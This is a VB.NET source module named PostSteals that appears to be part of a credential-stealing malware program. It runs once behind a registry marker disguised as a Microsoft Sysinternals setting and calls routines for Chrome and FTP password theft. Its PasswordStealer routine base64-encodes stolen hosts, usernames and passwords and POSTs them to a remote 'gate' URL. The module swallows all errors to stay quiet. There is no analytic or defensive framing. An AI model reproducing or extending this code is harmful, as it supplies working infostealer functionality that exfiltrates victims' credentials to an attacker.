Imports System.Net
Imports System.Text
Imports System.IO

Module PostSteals
    Public Sub RunStealer()
        On Error Resume Next
        If GetSetting("Microsoft", "Sysinternals", "S") = String.Empty Then
            GetChrome()
            ftpsteal()
            Call SaveSetting("Microsoft", "Sysinternals", "S", "1")
        End If
        Threading.Thread.Sleep(System.Threading.Timeout.Infinite)
    End Sub
    Public Sub PasswordStealer(ByVal Host As String, ByVal Username As String, ByVal password As String)
        Try
            Dim x = "*"
            Dim l = BASE64_Encode(Host & x & Username & x & password)
            Dim request As WebRequest = WebRequest.Create(GateURL)
            request.Method = "POST"
            Dim postData As String = "crypt2=" & l
            Dim byteArray As Byte() = Encoding.UTF8.GetBytes(postData)
            request.ContentType = "application/x-www-form-urlencoded"
            request.ContentLength = byteArray.Length
            Dim dataStream As Stream = request.GetRequestStream()
            dataStream.Write(byteArray, 0, byteArray.Length)
            dataStream.Close()
            Dim response As WebResponse = request.GetResponse()
            dataStream = response.GetResponseStream()
            Dim reader As New StreamReader(dataStream)
            Dim responseFromServer As String = reader.ReadToEnd()
            reader.Close()
            dataStream.Close()
            response.Close()
        Catch : End Try
    End Sub
End Module
